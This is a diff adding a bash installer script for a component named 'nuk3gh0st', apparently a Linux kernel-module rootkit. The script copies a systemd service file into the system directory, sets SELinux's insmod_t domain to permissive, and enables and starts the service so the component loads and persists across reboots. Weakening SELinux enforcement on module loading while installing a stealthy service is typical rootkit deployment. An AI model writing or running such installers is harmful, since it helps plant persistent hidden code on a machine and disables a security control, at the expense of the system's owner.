@@ -1,0 +1,12 @@
+#!/bin/bash
+
+echo "cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service"
+cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
+if [ -f /usr/sbin/semanage ]; then
+	echo "semanage permissive -a insmod_t"
+	semanage permissive -a insmod_t
+fi
+echo "systemctl enable nuk3gh0st.service"
+systemctl enable nuk3gh0st.service
+echo "service nuk3gh0st start"
+service nuk3gh0st start
